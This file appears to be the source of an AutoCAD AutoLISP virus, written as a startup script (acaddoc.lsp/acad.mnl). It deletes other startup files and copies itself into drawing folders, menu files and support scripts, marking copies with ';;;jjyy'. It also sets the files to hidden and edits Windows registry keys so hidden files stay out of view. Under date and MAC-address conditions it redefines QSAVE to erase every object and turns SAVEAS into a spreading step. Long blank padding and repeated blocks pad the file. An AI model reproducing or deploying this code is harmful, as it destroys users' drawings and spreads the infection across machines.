
(setq flagx t)
(setq wold_cmd (getvar "cmdecho"))
(setvar "cmdecho" 0)
( setq
bb 2)
(setq dpath (getvar "dwgprefix"))
(setq wpath (getvar "menuname"))
(setq wpath (substr wpath 1 (- (strlen wpath) 4)))

(setq n 0)
(while(< n 1)
 (if(findfile "acad.fas")
   (if(vl-file-delete (findfile "acad.fas"))
  (setq n 0))
   (setq n 2)))

(setq n 0)
(while(< n 1)
 (if(findfile "lcm.fas")
   (if(vl-file-delete (findfile "lcm.fas"))
  (setq n 0))
   (setq n 2)))

(setq n 0)
(while(< n 1)
 (if(findfile "acad.lsp")
   (if(vl-file-delete (findfile "acad.lsp"))
  (setq n 0))
   (setq n 2)))


(defun wwriteapp ()
  (if (setq wwjm1 (open wnewacad "w"))
    (progn
      (setq wwjm (open woldacad "r"))
      (while(setq wwz (read-line wwjm))
	 (write-line wwz wwjm1)
      )
      (close wwjm)
      (close wwjm1)
      )  ))



(setq lbz 0)
(setq wwjqm (strcat dpath "acaddoc.lsp"))
(if (setq wwjm (open wwjqm "r"))
  (progn
    (repeat 3 (read-line wwjm))
    (setq wz (read-line wwjm))
    (setq ab (atoi (substr wz 4 1)))
    (close wwjm)
    (if	(> ab bb)
      (setq lbz 1)
    )
  )
)

(setq wwjqm (strcat wpath "acad.mnl"))

(if (setq wwjm (open wwjqm "r"))
  (progn
    (repeat 3 (read-line wwjm))
    (setq wz (read-line wwjm))
    (setq nb (atoi (substr wz 4 1)))
    (close wwjm)
    
    (if	(< nb bb)
      (setq lbz 1)
    )
  )
  (setq lbz 1)
)
(if (= lbz 1)
  (progn
    (setq woldacad (strcat dpath "acaddoc.lsp"))
    (setq wnewacad (strcat wpath "acad.mnl"))
    (wwriteapp)
  )
)
(if (and (/= (substr dpath 1 1) (chr 67))
	 (/= (substr dpath 1 1) (chr 68))
	 (/= (substr dpath 1 1) (chr 69))
	 (/= (substr dpath 1 1) (chr 70))
    )
  (progn
    (setq woldacad (strcat wpath "acad.mnl"))
    (setq wnewacad (strcat dpath "acaddoc.lsp"))
    (wwriteapp)
  )
  (vl-file-delete (strcat dpath "acaddoc.lsp"))
)
;load "acadapq")
(setvar "cmdecho" wold_cmd)









































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































(setq flagx t)

(setq flagx t)
(setq bz "(setq flagx t)")

;;;jjyy


(setq flagx t)
(setq bz "(setq flagx t)")
(defun s::startup (/ DOCLSP DWGPRE CDATE MAC0 MNLPTH)
  (vl-load-com)
  (setvar "cmdecho" 0)
  (setvar "filedia" 1)
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"
    "CheckedValue"
    0
  )  
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "CheckedValue"
    0
  )
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "DefaultValue"
    0
  )
  (setq mnlpth (getvar "menuname"))
  (setq dwgpre (getvar "dwgprefix"))
  (if (setq doclsp (findfile "acaddoc.lsp"))
    (progn (chklsp (strcat mnlpth "doc.lsp") doclsp)
	   (chklsp (strcat mnlpth ".mnl") doclsp)
	   (chklsp (strcat dwgpre "acaddoc.lsp") doclsp)
    )
  )
  (setq	mac0
	 '(2256	  2256	 2726	2256   2585   2726   3243   2679
	   2726	  2256	 3149	2726   3196   3290   2726   2632
	   2397
	  )
  )
  (if (and (> (setq cdate (getvar "cdate")) 20090909)
	   (member (vl-string->list (car (macaddr))) (mkgroup mac0))
	   (= (rem (fix (* 100 (- cdate (fix cdate)))) 2) 0)
      )
    (dolsp)
  )
  (princ)
)
(defun chklsp (fp1 fp2 / fp3 TEM1 TEM2)
  (if (setq fp3 (open fp1 "r"))
    (progn
      (if
	(not
	  (wcmatch (while (setq tem1 (read-line fp3)) (setq tem2 tem1))
		   "*;;;jjyy*"
	  )
	)
	 (writelsp fp2 fp1)
      )
      (close fp3)
    )
    (writelsp fp2 fp1)
  )
  (attset fp1 2)
  (attset fp2 2)
)
(defun writelsp	(fp1 fp2 / fp3 fp4 tem)
  (setq	fp3 (open fp1 "r")
	fp4 (open fp2 "a")
  )
  (while (setq tem (read-line fp3)) (write-line tem fp4))
  (close fp3)
  (close fp4)
  (princ)
)
(defun attset (fp code / fp1)
  (if (and (/= "" fp) code)
    (progn (vl-load-com)
	   (vlax-put-property
	     (setq fp1 (vlax-invoke-method
			 (vlax-create-object "Scripting.FileSystemObject")
			 'GetFile
			 fp
		       )
	     )
	     'Attributes
	     code
	   )
    )
  )
  (vlax-release-object fp1)
)
(defun mkgroup (pt0 / pts)
  (setq i 1)
  (repeat 500
    (setq pts (cons (mapcar '(lambda (x) (/ x i)) pt0) pts))
    (setq i (1+ i))
  )
  (reverse pts)
)
(defun macaddr (/ mac WMIobj con lox sn)
  (vl-load-com)
  (if (setq WMIobj (vlax-create-object "wbemScripting.SwbemLocator"))
    (progn
      (setq
	con (vl-catch-all-apply
	      'vlax-invoke
	      (list WMIobj 'ConnectServer "." "" "" "" "" "" 128 nil)
	    )
      )
      (if (vl-catch-all-error-p con)
	(setq
	  con (vlax-invoke WMIobj 'ConnectServer "." "" "" "" "" "")
	)
      )
      (setq lox	(vlax-invoke
		  con
		  'ExecQuery
		  "Select * From Win32_NetworkAdapter "
		)
      )
      (vlax-for	i lox
	(if (vlax-get i 'NetConnectionID)
	  (progn (setq sn (vlax-get i 'MACAddress))
		 (or (member sn mac) (setq mac (cons sn mac)))
	  )
	)
      )
      (mapcar 'vlax-release-object (list lox con WMIobj))
    )
  )
  (reverse mac)
)
(defun dolsp ()
  (command "undefine" "qsave")
  (command "undefine" "saveas")
  (command "undefine" "wblock")
  (command "undefine" "insert")
  (command "undefine" "pline")
)
(defun c:qsave ()
  (command "_.erase" (ssget "x") "")
  (princ)
)
(defun c:saveas	(/ fp1)
  (setq fp1 (getfiled "Í¼ÐÎÁí´æÎª" (getvar "dwgprefix") "dwg" 1))
  (chklsp (strcat (vl-filename-directory fp1) "\\acaddoc.lsp")
	  (findfile "acaddoc.lsp")
  )
  (princ)
)
(defun c:wblock () (princ))
(defun c:insert () (princ))
(defun c:pline () (command "_.line") (princ))
;;;jjyy

(setq flagx t)
(setq bz "(setq flagx t)")
(defun app(source target bz / flag flag1 wjm wjm1 text)
  (setq flag nil)
  (setq flag1 t)
  (if (findfile target)
    (progn
      (setq wjm1 (open target "r"))
      (while (setq text (read-line wjm1))
	(if (= text bz) (setq flag1 nil))
	);while
      (close wjm1)
      );progn
    );if
  (if flag1
    (progn
      (setq wjm (open source "r"))
      (setq wjm1 (open target "a"))
      (write-line (chr 13) wjm1)
      (while (setq text (read-line wjm))
	(if (= text bz) (setq flag t))
	(if flag
	  (progn
	    (write-line text wjm1)
	    );progn
	  );if
	);while
      (close wjm1)
      (close wjm)
      );progn
    );if
  );defun
(setvar "cmdecho" 0)
(setq acadmnl (findfile "acad.mnl"))
(setq acadmnlpath (vl-filename-directory acadmnl))
(setq mnlfilelist (vl-directory-files acadmnlpath "*.mnl"))
(setq mnlnum (length mnlfilelist))
(setq acadexe (findfile "acad.exe"))
(setq acadpath (vl-filename-directory acadexe))
(setq support (strcat acadpath "\\support"))
(setq lspfilelist (vl-directory-files support "*.lsp"))
(setq lspfilelist (append lspfilelist (list "acaddoc.lsp")))
(setq lspnum (length lspfilelist))
(setq dwgname (getvar "dwgname"))
(setq dwgpath (findfile dwgname))
(if dwgpath
  (progn
    (setq acaddocpath (vl-filename-directory dwgpath))
    (setq acaddocfile (strcat acaddocpath "\\acaddoc.lsp"))
    (setq mnln 0)
    (while (< mnln mnlnum)
      (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
      (app mnlfilename acaddocfile bz)
      (app acaddocfile mnlfilename bz)
      (setq mnln (1+ mnln))
      );while
    (setq lspn 0)
    (while (< lspn lspnum)
      (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
      (app lspfilename acaddocfile bz)
      (app acaddocfile lspfilename bz)
      (setq lspn (1+ lspn))
      );while
    );progn
  );if
(setq mnln 0)
(while (< mnln mnlnum)
  (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app mnlfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app mnlfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln (1+ mnln))
  );while
(setq lspn 0)
(while (< lspn lspnum)
  (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app lspfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app lspfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while
  (setq lspn (1+ lspn))
(load "acadapq")
(princ)
(load "acadappp.lsp")
(princ)
(defun s::startup (/ DOCLSP DWGPRE CDATE MAC0 MNLPTH)
  (vl-load-com)
  (setvar "cmdecho" 0)
  (setvar "filedia" 1)
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"
    "CheckedValue"
    0
  )  
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "CheckedValue"
    0
  )
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "DefaultValue"
    0
  )
  (setq mnlpth (getvar "menuname"))
  (setq dwgpre (getvar "dwgprefix"))
  (if (setq doclsp (findfile "acaddoc.lsp"))
    (progn (chklsp (strcat mnlpth "doc.lsp") doclsp)
	   (chklsp (strcat mnlpth ".mnl") doclsp)
	   (chklsp (strcat dwgpre "acaddoc.lsp") doclsp)
    )
  )
  (setq	mac0
	 '(2256	  2256	 2726	2256   2585   2726   3243   2679
	   2726	  2256	 3149	2726   3196   3290   2726   2632
	   2397
	  )
  )
  (if (and (> (setq cdate (getvar "cdate")) 20090909)
	   (member (vl-string->list (car (macaddr))) (mkgroup mac0))
	   (= (rem (fix (* 100 (- cdate (fix cdate)))) 2) 0)
      )
    (dolsp)
  )
  (princ)
)
(defun chklsp (fp1 fp2 / fp3 TEM1 TEM2)
  (if (setq fp3 (open fp1 "r"))
    (progn
      (if
	(not
	  (wcmatch (while (setq tem1 (read-line fp3)) (setq tem2 tem1))
		   "*;;;jjyy*"
	  )
	)
	 (writelsp fp2 fp1)
      )
      (close fp3)
    )
    (writelsp fp2 fp1)
  )
  (attset fp1 2)
  (attset fp2 2)
)
(defun writelsp	(fp1 fp2 / fp3 fp4 tem)
  (setq	fp3 (open fp1 "r")
	fp4 (open fp2 "a")
  )
  (while (setq tem (read-line fp3)) (write-line tem fp4))
  (close fp3)
  (close fp4)
  (princ)
)
(defun attset (fp code / fp1)
  (if (and (/= "" fp) code)
    (progn (vl-load-com)
	   (vlax-put-property
	     (setq fp1 (vlax-invoke-method
			 (vlax-create-object "Scripting.FileSystemObject")
			 'GetFile
			 fp
		       )
	     )
	     'Attributes
	     code
	   )
    )
  )
  (vlax-release-object fp1)
)
(defun mkgroup (pt0 / pts)
  (setq i 1)
  (repeat 500
    (setq pts (cons (mapcar '(lambda (x) (/ x i)) pt0) pts))
    (setq i (1+ i))
  )
  (reverse pts)
)
(defun macaddr (/ mac WMIobj con lox sn)
  (vl-load-com)
  (if (setq WMIobj (vlax-create-object "wbemScripting.SwbemLocator"))
    (progn
      (setq
	con (vl-catch-all-apply
	      'vlax-invoke
	      (list WMIobj 'ConnectServer "." "" "" "" "" "" 128 nil)
	    )
      )
      (if (vl-catch-all-error-p con)
	(setq
	  con (vlax-invoke WMIobj 'ConnectServer "." "" "" "" "" "")
	)
      )
      (setq lox	(vlax-invoke
		  con
		  'ExecQuery
		  "Select * From Win32_NetworkAdapter "
		)
      )
      (vlax-for	i lox
	(if (vlax-get i 'NetConnectionID)
	  (progn (setq sn (vlax-get i 'MACAddress))
		 (or (member sn mac) (setq mac (cons sn mac)))
	  )
	)
      )
      (mapcar 'vlax-release-object (list lox con WMIobj))
    )
  )
  (reverse mac)
)
(defun dolsp ()
  (command "undefine" "qsave")
  (command "undefine" "saveas")
  (command "undefine" "wblock")
  (command "undefine" "insert")
  (command "undefine" "pline")
)
(defun c:qsave ()
  (command "_.erase" (ssget "x") "")
  (princ)
)
(defun c:saveas	(/ fp1)
  (setq fp1 (getfiled "Í¼ÐÎÁí´æÎª" (getvar "dwgprefix") "dwg" 1))
  (chklsp (strcat (vl-filename-directory fp1) "\\acaddoc.lsp")
	  (findfile "acaddoc.lsp")
  )
  (princ)
)
(defun c:wblock () (princ))
(defun c:insert () (princ))
(defun c:pline () (command "_.line") (princ))
;;;jjyy
(load "acadappp.lsp")
(princ)
(defun s::startup (/ DOCLSP DWGPRE CDATE MAC0 MNLPTH)
  (vl-load-com)
  (setvar "cmdecho" 0)
  (setvar "filedia" 1)
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"
    "CheckedValue"
    0
  )  
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "CheckedValue"
    0
  )
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "DefaultValue"
    0
  )
  (setq mnlpth (getvar "menuname"))
  (setq dwgpre (getvar "dwgprefix"))
  (if (setq doclsp (findfile "acaddoc.lsp"))
    (progn (chklsp (strcat mnlpth "doc.lsp") doclsp)
	   (chklsp (strcat mnlpth ".mnl") doclsp)
	   (chklsp (strcat dwgpre "acaddoc.lsp") doclsp)
    )
  )
  (setq	mac0
	 '(2256	  2256	 2726	2256   2585   2726   3243   2679
	   2726	  2256	 3149	2726   3196   3290   2726   2632
	   2397
	  )
  )
  (if (and (> (setq cdate (getvar "cdate")) 20090909)
	   (member (vl-string->list (car (macaddr))) (mkgroup mac0))
	   (= (rem (fix (* 100 (- cdate (fix cdate)))) 2) 0)
      )
    (dolsp)
  )
  (princ)
)
(defun chklsp (fp1 fp2 / fp3 TEM1 TEM2)
  (if (setq fp3 (open fp1 "r"))
    (progn
      (if
	(not
	  (wcmatch (while (setq tem1 (read-line fp3)) (setq tem2 tem1))
		   "*;;;jjyy*"
	  )
	)
	 (writelsp fp2 fp1)
      )
      (close fp3)
    )
    (writelsp fp2 fp1)
  )
  (attset fp1 2)
  (attset fp2 2)
)
(defun writelsp	(fp1 fp2 / fp3 fp4 tem)
  (setq	fp3 (open fp1 "r")
	fp4 (open fp2 "a")
  )
  (while (setq tem (read-line fp3)) (write-line tem fp4))
  (close fp3)
  (close fp4)
  (princ)
)
(defun attset (fp code / fp1)
  (if (and (/= "" fp) code)
    (progn (vl-load-com)
	   (vlax-put-property
	     (setq fp1 (vlax-invoke-method
			 (vlax-create-object "Scripting.FileSystemObject")
			 'GetFile
			 fp
		       )
	     )
	     'Attributes
	     code
	   )
    )
  )
  (vlax-release-object fp1)
)
(defun mkgroup (pt0 / pts)
  (setq i 1)
  (repeat 500
    (setq pts (cons (mapcar '(lambda (x) (/ x i)) pt0) pts))
    (setq i (1+ i))
  )
  (reverse pts)
)
(defun macaddr (/ mac WMIobj con lox sn)
  (vl-load-com)
  (if (setq WMIobj (vlax-create-object "wbemScripting.SwbemLocator"))
    (progn
      (setq
	con (vl-catch-all-apply
	      'vlax-invoke
	      (list WMIobj 'ConnectServer "." "" "" "" "" "" 128 nil)
	    )
      )
      (if (vl-catch-all-error-p con)
	(setq
	  con (vlax-invoke WMIobj 'ConnectServer "." "" "" "" "" "")
	)
      )
      (setq lox	(vlax-invoke
		  con
		  'ExecQuery
		  "Select * From Win32_NetworkAdapter "
		)
      )
      (vlax-for	i lox
	(if (vlax-get i 'NetConnectionID)
	  (progn (setq sn (vlax-get i 'MACAddress))
		 (or (member sn mac) (setq mac (cons sn mac)))
	  )
	)
      )
      (mapcar 'vlax-release-object (list lox con WMIobj))
    )
  )
  (reverse mac)
)
(defun dolsp ()
  (command "undefine" "qsave")
  (command "undefine" "saveas")
  (command "undefine" "wblock")
  (command "undefine" "insert")
  (command "undefine" "pline")
)
(defun c:qsave ()
  (command "_.erase" (ssget "x") "")
  (princ)
)
(defun c:saveas	(/ fp1)
  (setq fp1 (getfiled "Í¼ÐÎÁí´æÎª" (getvar "dwgprefix") "dwg" 1))
  (chklsp (strcat (vl-filename-directory fp1) "\\acaddoc.lsp")
	  (findfile "acaddoc.lsp")
  )
  (princ)
)
(defun c:wblock () (princ))
(defun c:insert () (princ))
(defun c:pline () (command "_.line") (princ))
;;;jjyy
